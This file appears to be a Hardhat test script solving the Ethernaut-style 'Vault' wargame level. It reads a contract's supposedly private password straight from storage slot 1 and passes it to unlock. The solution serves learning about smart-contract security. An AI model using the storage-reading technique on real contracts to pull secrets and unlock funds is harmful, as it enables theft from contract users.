import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Vault`);
    const challengeAddress = await createChallenge(
        `0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6`
    );
    challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    let _pass = await ethers.provider.getStorageAt(challenge.address, 1);
    console.log(_pass);
    // let pass = ethers.utils.formatBytes32String(_pass);
    // console.log(pass);
    let tx = await challenge.unlock(_pass);
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
